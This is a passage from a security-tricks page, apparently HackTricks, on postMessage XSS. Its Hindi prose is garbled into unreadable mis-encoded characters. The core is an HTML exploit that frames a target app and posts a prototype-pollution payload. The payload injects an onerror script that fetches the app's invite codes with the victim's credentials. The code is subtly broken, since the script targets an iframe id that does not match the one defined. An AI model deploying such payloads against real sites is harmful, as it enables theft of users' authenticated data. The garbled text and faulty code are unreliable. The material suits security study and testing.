рдПрдХ рдХреБрдЫ **рдмрд╣реБрдд рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рд╕рдордЭрд╛рдИ рдЧрдИ XSS `postMessage`** рдЗрд╕рдореЗрдВ рдорд┐рд▓ рд╕рдХрддреА рд╣реИ [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

рдПрдХ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛ рдЙрджрд╛рд╣рд░рдг **рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЙрд▓реНрдпреВрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рдФрд░ рдлрд┐рд░ XSS** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ `postMessage` рдХреЗ рд▓рд┐рдП рдПрдХ `iframe` рдХреЛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛:
```markup
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП**:

* [**рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг**](../deserialization/nodejs-proto-prototype-pollution/) рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкреЗрдЬ рдХреЗ рд▓рд┐рдП рд▓рд┐рдВрдХ
* [**XSS**](../xss-cross-site-scripting/) рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкреЗрдЬ рдХреЗ рд▓рд┐рдП рд▓рд┐рдВрдХ
* [**рдХреНрд▓рд╛рдЗрдВрдЯ рд╕рд╛рдЗрдб рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рд╕реЗ XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss) рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкреЗрдЬ рдХреЗ рд▓рд┐рдП рд▓рд┐рдВрдХ

## рд╕рдВрджрд░реНрдн

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* рдЕрднреНрдпрд╛рд╕ рдХреЗ рд▓рд┐рдП: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдиреЗ рдХрд╛ рдПрдХреНрд╕реЗрд╕ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛред**

</details>
